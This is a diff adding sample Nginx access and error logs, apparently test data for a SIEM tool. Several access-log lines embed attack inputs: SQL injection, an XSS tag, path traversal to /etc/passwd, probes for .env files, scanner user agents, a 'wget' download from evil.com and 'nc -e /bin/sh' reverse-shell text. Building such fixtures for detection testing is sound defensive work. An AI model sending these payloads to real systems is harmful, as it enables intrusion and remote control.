@@ -1,0 +1,20 @@
+# Sample Nginx Logs for AstroSIEM Testing
+
+[NGINX_ACCESS] 192.168.1.100 - - [20/Feb/2026:10:15:23 +0000] "GET /admin HTTP/1.1" 301 169 "-" "Mozilla/5.0"
+[NGINX_ACCESS] 192.168.1.100 - - [20/Feb/2026:10:15:24 +0000] "GET /admin/ HTTP/1.1" 200 2456 "-" "Mozilla/5.0"
+[NGINX_ACCESS] 203.0.113.50 - - [20/Feb/2026:10:16:00 +0000] "GET /api.php?id=1 UNION SELECT * FROM users HTTP/1.1" 500 1234 "-" "curl/7.68.0"
+[NGINX_ACCESS] 198.51.100.25 - - [20/Feb/2026:10:16:30 +0000] "POST /comment.php HTTP/1.1" 500 876 "-" "<script>alert(1)</script>"
+[NGINX_ACCESS] 192.168.1.100 - - [20/Feb/2026:10:17:00 +0000] "GET /../../etc/passwd HTTP/1.1" 400 234 "-" "Mozilla/5.0"
+[NGINX_ACCESS] 203.0.113.50 - - [20/Feb/2026:10:17:30 +0000] "GET /shell.php HTTP/1.1" 200 5678 "-" "wget http://evil.com/backdoor"
+[NGINX_ACCESS] 198.51.100.25 - - [20/Feb/2026:10:18:00 +0000] "GET /.env HTTP/1.1" 200 345 "-" "Mozilla/5.0"
+[NGINX_ACCESS] 45.33.32.156 - - [20/Feb/2026:10:18:30 +0000] "GET /nginx_status HTTP/1.1" 403 234 "-" "nginx/1.18.0"
+[NGINX_ACCESS] 192.168.1.100 - - [20/Feb/2026:10:19:00 +0000] "GET /wp-login.php HTTP/1.1" 200 5678 "-" "sqlmap/1.6"
+[NGINX_ACCESS] 203.0.113.50 - - [20/Feb/2026:10:19:30 +0000] "GET /phpinfo.php HTTP/1.1" 200 45678 "-" "Mozilla/5.0"
+[NGINX_ACCESS] 198.51.100.25 - - [20/Feb/2026:10:20:00 +0000] "GET /admin.php?exec=ls HTTP/1.1" 500 234 "-" "nc -e /bin/sh"
+[NGINX_ACCESS] 192.168.1.100 - - [20/Feb/2026:10:20:30 +0000] "GET / HTTP/1.1" 200 9876 "-" "masscan/1.3"
+
+[NGINX_ERROR] 2026/02/20 10:15:23 [error] 1234#1234: *567 connect() failed (111: Connection refused) while connecting to upstream
+[NGINX_ERROR] 2026/02/20 10:16:00 [error] 1234#1234: *568 no live upstreams while connecting to upstream
+[NGINX_ERROR] 2026/02/20 10:17:00 [warn] 1234#1234: *569 limiting connections by zone "limit_req_zone"
+[NGINX_ERROR] 2026/02/20 10:18:00 [error] 1234#1234: *570 client intended to send too large body: 1073741824 bytes
+[NGINX_ERROR] 2026/02/20 10:19:00 [error] 1234#1234: *571 upstream timed out (110: Connection timed out) while reading response header
